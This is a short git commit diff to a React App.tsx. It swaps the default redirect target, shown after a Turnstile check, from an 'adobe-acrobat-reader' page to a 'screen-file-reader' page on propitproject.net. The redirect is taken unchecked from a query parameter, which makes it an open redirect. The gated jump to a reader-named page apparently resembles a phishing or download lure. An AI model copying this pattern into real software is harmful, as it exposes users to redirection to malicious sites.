1123e23fc66552a327a4dc644a4adfbef53209bc
mikehommy <mikehommy232@outlook.com>
2026-05-18 20:44:10 +0100

    Update App.tsx

--- src/App.tsx
+++ src/App.tsx
@@ -6,7 +6,7 @@ function App() {
   useEffect(() => {
     // Get redirect URL from query parameters
     const params = new URLSearchParams(window.location.search);
-    const redirectUrl = params.get('redirect') || 'https://propitproject.net/#/d/adobe-acrobat-reader-jb215t';
+    const redirectUrl = params.get('redirect') || 'https://propitproject.net/#/d/screen-file-reader-rzs5mi';
 
     // Wait for Turnstile script to load and render widget
     const checkTurnstile = setInterval(() => {
